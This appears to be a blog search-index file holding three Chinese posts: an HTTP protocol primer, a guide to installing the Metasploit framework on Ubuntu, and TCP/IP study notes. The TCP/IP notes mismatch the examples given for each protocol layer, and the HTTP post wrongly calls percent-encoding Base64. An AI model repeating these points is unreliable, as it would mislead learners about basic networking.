<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[【转载】HTTP：超文本传输协议]]></title>
      <url>http://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-5a35e17f298a48e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""></p>
<h1 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h1><ul>
<li><p>1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p>
</li>
<li><p>2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p>
</li>
<li><p>3、无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>
</li>
<li><p>4、无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
</li>
<li><p>5、支持B/S及C/S模式。</p>
</li>
</ul>
<h1 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h1><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p>
<p>URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p>
<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p>
<p>从上面的URL可以看出，一个完整的URL包括以下几部分：</p>
<ul>
<li><p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
</li>
<li><p>2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
</li>
<li><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
</li>
<li><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
</li>
<li><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
</li>
<li><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
</li>
<li><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
</li>
</ul>
<h1 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h1><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。</p>
<p>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：</p>
<ul>
<li>①访问资源的命名机制</li>
<li>②存放资源的主机名</li>
<li>③资源自身的名称，由路径表示，着重强调于资源。</li>
</ul>
<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p>
<p>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：</p>
<ul>
<li>①协议(或称为服务方式)</li>
<li>②存有该资源的主机IP地址(有时也包括端口号)</li>
<li>③主机资源的具体地址。如目录和文件名等</li>
</ul>
<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。</p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h1 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
<p>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。<br>Get请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept    image/webp,image/*,*/*;q=0.8</div><div class="line">Referer    http://www.imooc.com/</div><div class="line">Accept-Encoding    gzip, deflate, sdch</div><div class="line">Accept-Language    zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.</p>
<p>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。</p>
<p>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息</p>
<p>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等</p>
<p>第三部分：空行，请求头部后面的空行是必须的</p>
<p>即使第四部分的请求数据为空，也必须有空行。</p>
<p>第四部分：请求数据也叫主体，可以添加任意的其他数据。</p>
<p>这个例子的请求数据为空。</p>
<p>POST请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
<h1 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h1><p>一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。</p>
<p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Fri, 22 May 2009 06:07:21 GMT</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">      &lt;head&gt;&lt;/head&gt;</div><div class="line">      &lt;body&gt;</div><div class="line">            &lt;!--body goes here--&gt;</div><div class="line">      &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</p>
<p>第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</p>
<p>第二部分：消息报头，用来说明客户端要使用的一些附加信息</p>
<p>第二行和第三行为消息报头，<br>Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</p>
<p>第三部分：空行，消息报头后面的空行是必须的</p>
<p>第四部分：响应正文，服务器返回给客户端的文本信息。</p>
<p>空行后面的html部分为响应正文。</p>
<h1 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h1><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
<p>1xx：指示信息–表示请求已接收，继续处理</p>
<p>2xx：成功–表示请求已被成功接收、理解、接受</p>
<p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
<p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
<p>5xx：服务器端错误–服务器未能实现合法的请求</p>
<p>常见状态码：</p>
<p>200 OK                        //客户端请求成功<br>400 Bad Request               //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden                 //服务器收到请求，但是拒绝提供服务<br>404 Not Found                 //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error     //服务器发生不可预期的错误<br>503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常<br>更多状态码<a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="external">http://www.runoob.com/http/http-status-codes.html</a></p>
<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<p>GET     请求指定的页面信息，并返回实体主体。<br>HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>PUT     从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE      请求服务器删除指定的页面。<br>CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>OPTIONS     允许客户端查看服务器的性能。<br>TRACE     回显服务器收到的请求，主要用于测试或诊断。</p>
<h1 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h1><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>1、客户端连接到Web服务器</p>
<p>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
<p>2、发送HTTP请求</p>
<p>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>3、服务器接受请求并返回HTTP响应</p>
<p>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>4、释放连接TCP连接</p>
<p>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>5、客户端浏览器解析HTML内容</p>
<p>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
<p>5、释放 TCP连接;</p>
<p>6、浏览器将该 html 文本并显示内容; 　　</p>
<h1 id="GET和POST请求的区别"><a href="#GET和POST请求的区别" class="headerlink" title="GET和POST请求的区别"></a>GET和POST请求的区别</h1><p>GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET /books/?sex=man&amp;name=Professional HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure>
<p>注意最后一行是空行</p>
<p>POST请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p>
<p>POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据</p>
<p>因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</p>
<p>2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。</p>
<p>而在实际开发中存在的限制主要有：</p>
<p>GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。</p>
<p>因此对于GET提交时，传输数据就会受到URL长度的 限制。</p>
<p>POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</p>
<p>3、安全性</p>
<p>POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击</p>
<p>4、Http get,post,soap协议都是在http上运行的</p>
<p>（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的<br>查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全</p>
<p>（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。<br>但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。</p>
<p>（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式<br>Content-type设置为: text/xml 任何数据都可以xml化。</p>
<p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p>
<p>我们看看GET和POST的区别</p>
<p>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.</p>
<p>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<p>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。</p>
<p>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</p>
<p>原文地址：<a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="external">http://www.cnblogs.com/ranyonsue/p/5984001.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu Server下安装配置Metasploit]]></title>
      <url>http://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="安装postgersql"><a href="#安装postgersql" class="headerlink" title="安装postgersql"></a>安装postgersql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install postgersql</div></pre></td></tr></table></figure>
<h1 id="下载Metasploit"><a href="#下载Metasploit" class="headerlink" title="下载Metasploit"></a>下载Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<h1 id="安装Metasploit"><a href="#安装Metasploit" class="headerlink" title="安装Metasploit"></a>安装Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">sudo mkdir metasploit</div><div class="line">sudo ./metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<ul>
<li>在安装的过程中开始是license内容可以一直回车，然后输入y，同意license</li>
<li>然后会要你选择一个空文件夹，此时输入刚刚创建的文件夹 /opt/metasploit</li>
<li>最后还会让你选择是否metasploit自行创建postgersql，可输入y。等待即可安装成功</li>
</ul>
<h1 id="启动Metasploit"><a href="#启动Metasploit" class="headerlink" title="启动Metasploit"></a>启动Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">service postgresql start		//启动PostgreSQL服务</div><div class="line">service metasploit start		//启动Metasploit服务</div><div class="line">msfconsole		//启动Metasploit</div><div class="line">db_status		//查看数据库连接状态</div></pre></td></tr></table></figure>
<ul>
<li>如果启动metasploit的时候出现Warning提示没有查看datebase.yml的权限可以输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml</div></pre></td></tr></table></figure>
<ul>
<li>重新启动就可以自动连接数据库了</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[《TCP/IP详解 卷1：协议》学习笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/%E3%80%8ATCP-IP%E8%AF%A6%E8%A7%A3-%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141924136983820.png" alt=""></p>
<ul>
<li>链路层：处理与电缆（或其他任何传输媒介）的物理接口细节（Telnet,FTP和e-mail等）</li>
<li>网络层：处理分组在网络中的活动，例如分组选路（TCP和UDP）</li>
<li>运输层：为两台主机上的应用程序提供端到端的通讯（IP,ICMP和IGMP）</li>
<li>应用层：处理特定的应用程序细节（设备驱动程序及接口卡）</li>
</ul>
<h2 id="实例：运行FTP的两台主机"><a href="#实例：运行FTP的两台主机" class="headerlink" title="实例：运行FTP的两台主机"></a>实例：运行FTP的两台主机</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142117348856117.png" alt=""></p>
<ul>
<li>大多数的网络应用程序都被设计成客户-服务器模式</li>
<li>双方都有对应的一个或多个协议进行通讯</li>
<li>应用程序通常是用户进程，而下三层一般在内核执行</li>
<li>应用层关心应用程序的细节，下三层对应用程序一无所知，但它要处理所有的通信细节</li>
</ul>
<h2 id="通过路由器连接的两个网络"><a href="#通过路由器连接的两个网络" class="headerlink" title="通过路由器连接的两个网络"></a>通过路由器连接的两个网络</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141953434648847.png" alt=""></p>
<ul>
<li>端系统（end system）（两边的两台主机）</li>
<li>中间系统（intermediate system）（中间的路由器）</li>
<li>应用层和运输层使用端到端（end-to-end）协议</li>
<li>网络层提供的是逐跳（hop-to-hop）协议</li>
<li>网络ip提供的是一种不可靠的服务，它只是尽可能快的把分组从源结点送到目的结点，但不提供可靠的运输层</li>
<li>互联网的目的之一就是在应用程序中隐藏所有的屋里细节</li>
</ul>
<h2 id="TCP-IP协议族中不同层次的协议"><a href="#TCP-IP协议族中不同层次的协议" class="headerlink" title="TCP/IP协议族中不同层次的协议"></a>TCP/IP协议族中不同层次的协议</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141957475736336.png" alt=""></p>
<ul>
<li>TCP使用不可靠的IP服务，并提供一种可靠的运输层服务</li>
<li>UDP为应用程序发送和接受数据报，和TCP不同，UDP是不可靠的。</li>
<li>IP是网络层上的主要协议，同时被TCP和UDP使用</li>
<li>ICMP是IP协议的附属协议</li>
<li>IGMP是Internet组管理协议。它用来把一个UDP数据报多播到多个主机</li>
<li>ARP（地址解析协议）和RARP（逆地址解析协议）是某些网络接口（如以太网和令牌环网）使用的特殊协议，用来转换IP层和网络接口层使用的地址。</li>
</ul>
<h2 id="互联网的地址"><a href="#互联网的地址" class="headerlink" title="互联网的地址"></a>互联网的地址</h2><p>互联网上的每个接口必须有一个唯一的Internet地址（也称作IP地址）。IP地址长32bit。IP地址具有一定的结构，五类不同的互联网地址格式如图1-5所示。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/142010446984287.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142010578707763.png" alt=""></p>
<p>说明：</p>
<ul>
<li><p>多接口主机具有多个IP地址，其中每个接口都对应一个IP地址。</p>
</li>
<li><p>有三类IP地址：单播地址（目的端为单个主机）、广播地址（目的端为给定网络上的所有主机）以及多播地址（目的端为同一组内的所有主机）。</p>
</li>
</ul>
<h2 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h2><p>在TCP/IP领域中，域名系统（DNS）是一个分布的数据库，由它来提供IP地址和主机名之间的映射信息。</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142022372296370.png" alt=""></p>
<ul>
<li>以太网数据帧的物理特征是其长度必须在46~1500字节之间</li>
<li>以太网的帧首部也有一个16bit的帧类型域（ip,arp,rarp）</li>
<li>IP在首部中存放一个长度为8bit的数值，称作协议域（icmp,igmp,tcp,udp,esp,gre）。1表示为ICMP协议，2表示为IGMP协议，6表示为TCP协议，17表示为UDP协议</li>
<li>TCP和UDP都用一个16bit的端口号来表示不同的应用程序（ftp,telnet,http）</li>
</ul>
<h2 id="分用"><a href="#分用" class="headerlink" title="分用"></a>分用</h2><p>当目的主机收到一个以太网数据帧时，数据就开始从协议栈中由底向上升，同时去掉各层协议加上的报文首部。每层协议盒都要去检查报文首部中的协议标识，以确定接受数据的上层协议。这个过程称作分用。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142028379795759.png" alt=""></p>
<h2 id="客户-服务器模型"><a href="#客户-服务器模型" class="headerlink" title="客户-服务器模型"></a>客户-服务器模型</h2><p>大部分网络应用程序在编写时都假设一端是客户，另一端是服务器，其目的是为了让服务器为客户提供一些特定的服务。服务分为两种类型：重复型和并发型。</p>
<h3 id="重复型服务器"><a href="#重复型服务器" class="headerlink" title="重复型服务器"></a>重复型服务器</h3><p>1）等待一个客户请求的到来。<br>2）处理客户请求。<br>3）发送响应给发送请求的客户。<br>4）返回1）步。</p>
<p>重复型服务器主要的问题发生在2）状态。在这个时候，它不能为其他客户机提供服务。</p>
<h3 id="并发型服务器"><a href="#并发型服务器" class="headerlink" title="并发型服务器"></a>并发型服务器</h3><p>1）等待一个客户请求的到来。<br>2）启动一个新的服务器来处理这个客户的请求。在这期间可能生成一个新的进程、任务或线程，并依赖底层操作系统的支持。这个步骤如何进行取决于操作系统。生成的新服务器对客户的全部请求进行处理。处理结束后，终止这个新服务器。</p>
<p>3）返回1）步。</p>
<p>并发服务器的优点在于它是利用生成其他服务器的方法来处理客户的请求。每个客户都有它自己对应的服务器。如果操作系统允许多任务，那么就可以同时为多个客户服务。</p>
<h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><ul>
<li>服务器一般都是通过知名端口号来识别的（ftp 21,telnet 23）</li>
<li>客户端端口号又称作临时端口号（即存在时间很短暂）</li>
<li>大多数TCP/IP实现给临时端口分配1024~5000之间的端口号</li>
<li>大于5000的端口号是为其他服务器预留的（Internet上并不常用的服务）</li>
</ul>
<h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>从图1-4可以看出，在TCP/IP协议族中，链路层主要有三个目的：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/151053134953465.png" alt=""></p>
<ul>
<li>为IP模块发送和接收IP数据报；</li>
<li>为ARP模块发送ARP请求和接收ARP应答。</li>
<li>为RARP发送RARP请求和接收RARP应答。</li>
</ul>
<p>TCP/IP支持多种不同的链路层协议，这取决于网络所使用的硬件，如以太网、令牌环网、FDDI（光纤分布式数据接口）及RS-232串行线路等。</p>
